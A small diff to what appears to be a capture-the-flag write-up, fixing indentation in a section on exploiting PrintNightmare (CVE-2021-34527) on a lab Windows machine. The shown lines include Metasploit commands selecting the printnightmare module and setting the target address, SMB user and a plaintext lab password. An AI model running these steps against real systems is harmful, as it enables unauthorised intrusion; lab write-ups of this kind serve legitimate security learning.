@@ -131,7 +131,7 @@ Grabbed user.txt flag: ```C:\Users\svc-print\desktop> type user.txt``` </br>
 I found out that Papercut print logger was vulnerable to [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) (Print Nightmare): </br>
 I checked if it's vulnerable to that using msfconsole: </br>
 ```bash
-	use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
+use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
 set RHOSTS 10.10.10.193
 set SMBUser svc-print 
 set SMBPass $fab@s3Rv1ce$1 
